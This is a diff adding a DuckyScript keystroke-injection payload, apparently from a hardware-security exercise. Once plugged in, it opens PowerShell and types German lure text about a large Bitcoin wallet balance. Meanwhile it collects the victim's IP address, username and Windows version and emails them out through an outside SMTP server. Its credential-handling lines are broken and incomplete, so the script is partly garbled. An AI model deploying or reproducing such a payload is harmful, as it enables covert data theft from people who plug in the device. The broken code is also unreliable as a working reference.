@@ -1,0 +1,56 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING clear
+ENTER
+DELAY 100
+STRING $a = "Prüfe den Kontostand des Bitcoin Wallets"
+ENTER
+ENTER
+STRING $a = "Kontostand: 21,7369 BTC = 1.475.350 $"
+ENTER
+ENTER
+STRING $a = "Bitte NICHT das Programm beenden und die Wallet NICHT entfernen!"
+
+ENTER
+ENTER
+STRING $a = "Lade Systendaten"
+ENTER
+STRING $a = "Bitte warten
+DELAY 700
+STRING .
+DELAY 700
+STRING .
+DELAY 700
+STRING ."
+ENTER
+STRING $1 = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq "Ethernet" } | Select-Object -ExpandProperty IPAddress
+ENTER
+STRING $2 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+ENTER
+STRING $os = Get-CimInstance -ClassName Win32_OperatingSystem
+ENTER 
+STRING $3 = $os.Caption 
+ENTER
+STRING $4 = $os.Version
+ENTER
+
+REM cred
+
+STRING | ConvertTo-SecureString -AsPlainText -Force
+ENTER
+STRING $cred = New-Object -TypeName System.Management.Automation.PSCredential($user, $pass)
+ENTER
+STRING $smtp = "mail.th-brandenburg.de"
+ENTER
+STRING Send-MailMessage -From $a -to $a -Subject "HardwareSec" -Body "$1 $2 $3 $4" -SmtpServer $smtp -Port 587 -Credential $cred
+ENTER
+
+
+
+
+
